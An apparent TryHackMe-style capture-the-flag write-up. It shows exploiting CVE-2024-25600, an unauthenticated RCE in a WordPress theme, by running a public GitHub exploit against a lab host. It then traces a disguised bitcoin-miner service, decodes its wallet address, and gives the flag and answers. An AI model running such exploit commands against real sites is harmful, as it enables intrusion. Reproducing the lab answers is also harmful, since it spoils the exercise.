## Description

So on this task main vuln is `CVE-2024-25600` critical Remote Code Execution (RCE). It allows unauthenticated users to execute arbitrary PHP code through the REST API endpoint you just found.
You can additionally research it optionally.


## Reconnaissance
 
 1. `nmap -sCV <IP>` shows as that http-generator is WordPress 6.5

## Exploit

 1. To exploit I use existing python3 exploit. Here is link to repo and additionally file: `https://github.com/Chocapikk/CVE-2024-25600`
 2. After download exploit try run it with https(443) instead basic http(80)
	```
python3 exploit.py -u https://bricks.thm
	```
 3. After run `ls` command we see first task(flag) just `cat` it:
	```
# ls
650c844110baced87e1606453b93f22a.txt
# cat 650c844110baced87e1606453b93f22a.txt
THM{fl46_650c844110baced87e1606453b93f22a} 
	```
 4. Next task is **What is the name of the suspicious process?**
If you check all processes with `systemctl` you can that on of all of them has desription **TRYHACK3M**
```
  ubuntu.service                                   loaded active     running   TRYHACK3M                                                                    
```
Ok, now we now which service. Lets check status:
```
# systemctl status ubuntu.service
Main PID: 2770 (nm-inet-dialog)
```
We see that main process id with 2770 is `nm-inet-dialog`. This is the answer.
 5. Next: **What is the service name affiliated with the suspicious process?**
We already know that service name is `ubuntu.service`. That correct.

 6. Next: **What is the log file name of the miner instance?**
To find log file we should go to directory where nm-inet-dialog exist. It's `lib/NetworkMabager` and do `ls`
```
# ls /lib/NetworkManager
VPN
conf.d
dispatcher.d
inet.conf
nm-dhcp-helper
nm-dispatcher
nm-iface-helper
nm-inet-dialog
nm-initrd-generator
nm-openvpn-auth-dialog
nm-openvpn-service
nm-openvpn-service-openvpn-helper
nm-pptp-auth-dialog
nm-pptp-service
system-connections
```
Right answer is: `inet.conf`

7. Next: **What is the wallet address of the miner instance?**. Cat the conf file we see what happened. Here short but main part
```
# cat /lib/NetworkManager/inet.conf
ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
2024-04-08 10:46:04,743 [*] confbak: Ready!
2024-04-08 10:46:04,743 [*] Status: Mining!
2024-04-08 10:46:08,745 [*] Miner()
2024-04-08 10:46:08,745 [*] Bitcoin Miner Thread Started
2024-04-08 10:46:08,745 [*] Status: Mining!
2024-04-08 10:46:10,747 [*] Miner()
2024-04-08 10:46:12,748 [*] Miner()
2024-04-08 10:46:14,751 [*] Miner()
2024-04-08 10:46:16,753 [*] Miner()
2024-04-08 10:46:18,755 [*] Miner()
2024-04-08 10:46:20,757 [*] Miner()
2024-04-08 10:46:22,760 [*] Miner()
2024-04-08 10:46:24,762 [*] Miner()
```

The ID is hash and double base64 encoded id. To see original ID I used `cybershef` with Recipe `From Hex` -> `From Base64` -> `From Base64` and get result:
```
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qabc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa
```
The id is repeated, main is `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`. That is right answer.

8. The answer of q8 I just get from google, youtube and so on. 
It's `LockBit`

That all from me. Thanks and bb.
